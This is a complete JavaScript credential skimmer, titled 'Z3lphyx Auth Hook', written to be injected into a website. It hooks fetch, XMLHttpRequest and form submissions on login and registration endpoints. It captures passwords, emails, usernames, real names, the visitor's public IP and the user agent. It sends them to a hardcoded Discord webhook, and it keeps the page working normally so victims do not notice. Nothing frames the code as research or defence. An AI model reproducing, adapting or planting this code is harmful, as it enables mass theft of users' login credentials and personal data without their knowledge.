// Z3lphyx Auth Hook — Interception des credentials
(function() {
    'use strict';

    const WEBHOOK = "https://discord.com/api/webhooks/1506998147434676304/jVsItbE7-LukI-fyshElFimQcZEb8iWi7CZ2ANdXZoIJOwmAItJWB9mbdEmjStI8uRSA";
    let cachedIP = null;

    // --- Récupération IP publique ---
    async function getIP() {
        if (cachedIP) return cachedIP;
        for (const url of ['https://api.ipify.org?format=json', 'https://ipapi.co/json/']) {
            try {
                const r = await fetch(url, { signal: AbortSignal.timeout(4000) });
                const d = await r.json();
                cachedIP = d.ip || d;
                return cachedIP;
            } catch {}
        }
        return 'Inconnu';
    }
    getIP(); // pré-cache

    // --- Envoi Discord ---
    async function webhook(embed) {
        try {
            await fetch(WEBHOOK, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    username: 'Z3lphyx Auth',
                    embeds: [embed]
                })
            });
        } catch {}
    }

    function buildEmbed(title, color, fields) {
        return {
            title, color, fields,
            footer: { text: `Z3lphyx Auth · ${new Date().toLocaleString('fr-FR')}` },
            timestamp: new Date().toISOString()
        };
    }

    function isAuthURL(str) {
        return /\/api\/(auth|login|register|sign|gateway|token|session|connect)/i.test(str);
    }

    // --- Extraction des credentials depuis le body JSON ---
    function parseCreds(body) {
        try {
            const d = typeof body === 'string' ? JSON.parse(body) : body;
            const c = {};
            for (const [k, v] of Object.entries(d)) {
                const kl = k.toLowerCase();
                if (/pass|mdp|motdepasse/i.test(kl)) c.password = v;
                else if (/email|mail|adresse/i.test(kl)) c.email = v;
                else if (/pseudo|username|user|login|identifier/i.test(kl)) c.username = v;
                else if (/nom|surname|last.?name|family.?name/i.test(kl)) c.nom = v;
                else if (/prenom|first.?name|given.?name|prénom/i.test(kl)) c.prenom = v;
                else c[k] = v;
            }
            return c.password ? c : null;
        } catch { return null; }
    }

    async function handleCapture(creds, source) {
        const ip = await getIP();
        const ua = navigator.userAgent;
        const hasNames = creds.nom || creds.prenom;
        const fieldCount = Object.keys(creds).filter(k => k !== 'password').length;

        if (hasNames || fieldCount > 2) { // INSCRIPTION
            webhook(buildEmbed('📝 Nouvelle Inscription [' + source + ']', 0x00ff88, [
                { name: '👤 Nom',      value: creds.nom || 'N/A', inline: true },
                { name: '👤 Prénom',   value: creds.prenom || 'N/A', inline: true },
                { name: '🏷️ Pseudo',  value: creds.username || 'N/A', inline: true },
                { name: '📧 Email',    value: creds.email || 'N/A', inline: true },
                { name: '🔑 Mot de passe', value: '||' + (creds.password || '') + '||', inline: false },
                { name: '🌐 IP',       value: '||' + ip + '||', inline: true },
                { name: '🧭 User-Agent', value: '```' + ua.slice(0, 180) + '```', inline: false }
            ]));
        } else { // CONNEXION
            webhook(buildEmbed('🔐 Connexion Détectée [' + source + ']', 0x00f0ff, [
                { name: '👤 Identifiant', value: creds.email || creds.username || 'N/A', inline: true },
                { name: '🔑 Mot de passe', value: '||' + (creds.password || '') + '||', inline: false },
                { name: '🌐 IP',          value: '||' + ip + '||', inline: true },
                { name: '🧭 User-Agent',  value: '```' + ua.slice(0, 180) + '```', inline: false }
            ]));
        }
    }

    // =========================================================
    // 1️⃣ INTERCEPTION FETCH
    // =========================================================
    const _fetch = window.fetch;
    window.fetch = async function(input, init) {
        let body = null;
        let url = '';

        if (typeof input === 'string') url = input;
        else if (input instanceof Request) url = input.url;

        if (init && init.body) body = init.body;
        else if (input instanceof Request) {
            try { body = await input.clone().text(); } catch {}
        }

        const r = await _fetch.apply(this, arguments);

        if (body && isAuthURL(url)) {
            const creds = parseCreds(body);
            if (creds) handleCapture(creds, 'Fetch');
        }

        return r;
    };

    // =========================================================
    // 2️⃣ INTERCEPTION XMLHttpRequest
    // =========================================================
    const _open = XMLHttpRequest.prototype.open;
    const _send = XMLHttpRequest.prototype.send;

    XMLHttpRequest.prototype.open = function(m, u) {
        this._hookURL = (u || '').toString();
        return _open.apply(this, arguments);
    };

    XMLHttpRequest.prototype.send = function(body) {
        if (body && isAuthURL(this._hookURL || '')) {
            const creds = parseCreds(body);
            if (creds) setTimeout(() => handleCapture(creds, 'XHR'), 10);
        }
        return _send.apply(this, arguments);
    };

    // =========================================================
    // 3️⃣ SURVEILLANCE DOM (filet de sécurité)
    // =========================================================
    setTimeout(() => {
        const observer = new MutationObserver(() => {
            document.querySelectorAll('form').forEach(form => {
                if (form.dataset.zHook) return;
                const pwd = form.querySelector('input[type="password"]');
                if (!pwd) return;
                form.dataset.zHook = '1';
                form.addEventListener('submit', async () => {
                    const f = new FormData(form);
                    const c = {};
                    for (const [k, v] of f.entries()) c[k] = v;
                    if (!c.password && !c.mot_de_passe && !c.mdp) return;
                    if (!c.email && !c.pseudo && !c.username && !c.nom) return;
                    // Nettoyer: retirer les champs vides
                    for (const k of Object.keys(c)) if (!c[k]) delete c[k];
                    handleCapture({
                        password: c.password || c.mot_de_passe || c.mdp,
                        email: c.email || c.mail,
                        username: c.pseudo || c.username || c.user || c.login || c.identifier,
                        nom: c.nom || c.last_name || c.surname,
                        prenom: c.prenom || c.first_name || c.prénom
                    }, 'DOM');
                }, true);
            });
        });
        observer.observe(document.body || document.documentElement, {
            childList: true, subtree: true
        });
    }, 1500);

})();